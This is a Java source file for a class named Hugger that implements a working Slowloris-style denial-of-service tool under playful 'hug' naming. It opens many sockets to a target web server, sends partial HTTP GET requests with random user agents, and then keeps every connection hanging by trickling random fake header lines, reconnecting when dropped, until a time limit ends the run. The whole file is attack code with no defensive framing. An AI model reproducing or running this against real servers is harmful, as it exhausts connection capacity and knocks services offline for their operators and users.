package com.hugs;

import java.io.*;
import java.net.*;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import static com.hugs.UserAgents.AGENTS;
import static com.hugs.Utils.RND;
import static com.hugs.Utils.sleep;
import static java.lang.Math.max;

public class Hugger implements Runnable {

    private static final Logger log = LogManager.getLogger(Hugger.class);

    private static final int PAUSE_BETWEEN_REQUESTS = 2000;

    private URL hugReceiver;
    private int port;
    private int hugTime;
    private int connections;
    private Socket[] sockets;
    private String[] partialRequests;

    private boolean keepHugsIfNoResponse = false;
    private boolean stop = false;

    public Hugger(URL hugReceiver, Conf conf) {
        this.hugReceiver = hugReceiver;
        port = conf.port();
        hugTime = conf.timeLimit();
        connections = conf.connections();
        sockets = new Socket[connections];
        partialRequests = createInitialPartialRequests();
        keepHugsIfNoResponse = conf.hugUnresponsiveReceiver();
    }

    @Override
    public void run() {
        long startTime = System.currentTimeMillis();

        // each connection sends a partial request
        for (int i = 0; i < connections && !stop; i++) {
            initConnection(i);
            sendPartialRequest(i);
            sleep(100, PAUSE_BETWEEN_REQUESTS);
        }

        int wave = 0;
        while (!endCondition(startTime)) {
            hug();
            log.info("{} wave of hugs for {}", wave++, hugReceiver);
        }

        log.info("{} had enough hugs. Ending", hugReceiver);
        try {
            closeAllConnections();
        } catch (IOException e){
            log.error("{}: Couldn't close connections", hugReceiver);
        }
    }

    public void stop() {
        log.info("Stopping because of an external signal");
        stop = true;
    }

    private boolean endCondition(long startTime) {
        boolean timeout = hugTime > 0 ? (System.currentTimeMillis() - startTime) < (hugTime * 60 * 1000) : false;
        return stop || timeout;
    }

    /**
     * creates the initial partial requests that are sent to the server
     *
     * @return a string array containing all the partial HTTP GET requests for every connection this Connector manages
     */
    private String[] createInitialPartialRequests() {
        String[] allPartials = new String[connections];
        if (!stop){
            String pagePrefix = "/";
            if (hugReceiver.getPath().startsWith("/")) pagePrefix = "";

            String type = "GET " + pagePrefix + hugReceiver.getPath() + " HTTP/1.1" +  System.lineSeparator();
            String host = "Host: " + hugReceiver.getHost() + (port == 80 ? "" : ":" + port) + System.lineSeparator();
            String contentType = "Content-Type: */* " +  System.lineSeparator();
            String connection = "Connection: keep-alive" +  System.lineSeparator();

            for (int i = 0; i < connections; i++) {
                allPartials[i] = type + host + contentType + connection + AGENTS[RND.nextInt(AGENTS.length)] + System.lineSeparator();
            }
        }

        return allPartials;
    }

    /**
     * used to start a connection with the server for a specified index. Sets up the socket
     *
     * @param index which connction index to set up
     */
    private void initConnection(int index) {
        try {
            if (!stop){
                log.info("Establishing connection to {}: {}", hugReceiver, index);
                InetAddress address = InetAddress.getByName(hugReceiver.getHost());
                sockets[index] = new Socket(address, port);
            }
        } catch(ConnectException e){
            stop = keepHugsIfNoResponse ? stop : true;
            log.info("{} doesn't respond to hugs anymore", hugReceiver);
        } catch (IOException e) {
            stop = true;
            log.error("Couldn't establish connection to {}. Stopping", hugReceiver);
            log.debug("Reason: ", e);
        }
    }

    /**
     * "gracefully" terminates all the connections by sending \n
     */
    private void closeAllConnections() throws IOException {
        for (int i = 0; i < connections; i++) {
            try {
                if (sockets[i] != null) sockets[i].getOutputStream().write(System.lineSeparator().getBytes());
            } catch (IOException e) {
                log.warn("Couldn't gracefully close connections");
                log.debug("Reason:", e);
            } finally {
                if (sockets[i] != null) sockets[i].close();
            }
        }
    }

    /**
     * sends useless information to the server for each connection. Keeps the connection alive
     */
    private void hug() {
        for (int i = 0; i < connections && !stop; i++) {
            sendFalseHeaderField(i);
            sleep(100, max(200, PAUSE_BETWEEN_REQUESTS / connections));
        }
        sleep(100, PAUSE_BETWEEN_REQUESTS); // wait a random time before sending
    }

    /**
     * sends a fake header to the server so the server keeps the connection open
     *
     * @param index the index of the connection to send the fake info
     */
    private void sendFalseHeaderField(int index) {
        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        String fakeField = alphabet[RND.nextInt(alphabet.length)] + "-" + alphabet[RND.nextInt(alphabet.length)] + ": " + RND.nextInt() + System.lineSeparator();
        try {
            if (sockets[index] != null) sockets[index].getOutputStream().write(fakeField.getBytes());
        } catch (IOException e) {
            log.error("Failed to send header to {}. Reconnecting...", hugReceiver);
            log.debug("Reason:", e);
            initConnection(index); // try to re-connect
        }
    }

    /**
     * sends a partial HTTP GET request to the server
     *
     * @param index the Socket at index is used to send the request
     */
    private void sendPartialRequest(int index) {
        try {
            // write a random partial HTTP GET request to the server
            if (sockets[index] != null) {
                log.info("Sending partial request to: {} [{}]", hugReceiver, index);
                sockets[index].getOutputStream().write(partialRequests[RND.nextInt(connections)].getBytes());
            }
        } catch (IOException e) {
            log.error("Failed to send partial request to {}. Reconnecting...", hugReceiver);
            log.debug("Exception:", e);
            initConnection(index); // try to reestablish connection
        }
    }

}
